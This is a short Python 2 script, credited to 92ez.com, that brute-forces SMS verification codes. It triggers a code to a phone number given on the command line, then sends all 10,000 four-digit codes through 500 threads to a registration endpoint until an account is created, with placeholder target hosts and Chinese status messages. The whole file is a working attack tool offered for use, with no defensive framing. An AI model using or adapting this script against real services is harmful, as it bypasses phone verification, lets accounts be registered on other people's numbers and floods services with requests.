#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

import threading
import requests
import Queue
import json
import sys
import re

#
def bThread(realcode):
    
    threadl = []
    queue = Queue.Queue()
    for code in realcode:
        queue.put(code)

    for x in xrange(0, 500):
        threadl.append(tThread(queue))
        
    for t in threadl:
        t.start()
    for t in threadl:
        t.join()        

#create thread
class tThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        
        while not self.queue.empty(): 
            code = self.queue.get()
            try:
                doReg(code)
            except:
                continue

def trackIt():
    regPhone = sys.argv[1]
    url = 'http://123123.com/fetchVerifyCode&phone=' + regPhone
    header = {
        "Host": "*.*.*.*:80",
        "uid": "",
        "Accept": "*/*",
        "clientType": "2",
        "Cookie": "JSESSIONID=(null)",
        "User-Agent": "(iPhone; iOS 9.3.2; Scale/2.00)",
        "Accept-Language": "zh-Hans-CN;q=1",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close"
    }
    try:
        req = requests.get(url = url,headers = header,timeout = 5)
        result = req.content
        jsonData = json.loads(result)

        if jsonData['code'] == 0:
            print '[*] 短信发送成功'
            createCode()
        else:
            print '[*] 请三分钟后再试'

    except Exception,e:
        print e

def createCode():
    print '[*] 开始爆破验证码'

    realcode = []

    for code in range(0,10000):
        if len(str(code)) == 1:
            realcode.append('000' + str(code))
        if len(str(code)) == 2:
            realcode.append('00' + str(code))
        if len(str(code)) == 3:
            realcode.append('0' + str(code))
        if len(str(code)) == 4:
            realcode.append(str(code))

    try:
        bThread(realcode)
    except KeyboardInterrupt:
        print 'Keyboard Interrupt!'
        sys.exit()

def doReg(code):
    url = 'http://11111.com/userRegister'
    header = {
        "Host": "*.*.*.*:80",
        "uid": "",
        "Accept": "*/*",
        "Accept-Language": "zh-Hans-CN;q=1",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "clientType": "2",
        "User-Agent": "(iPhone; iOS 9.3.2; Scale/2.00)",
        "Connection": "close",
        "Content-Length": "75",
        "Cookie": "JSESSIONID=(null)"
    }

    params = {"password":"21218CCA77804D2BA1922C33E0151105","phone":sys.argv[1],"verifyCode":code}

    try:
        req = requests.post(url = url,headers = header,data = params,timeout = 5)
        result = req.content
        jsonData = json.loads(result)

        if jsonData['code'] == 0:
            print '[*] 注册成功'
            sys.exit('[*] 爆破验证码为'+code)

    except Exception,e:
        print e

if __name__ == '__main__':
    trackIt()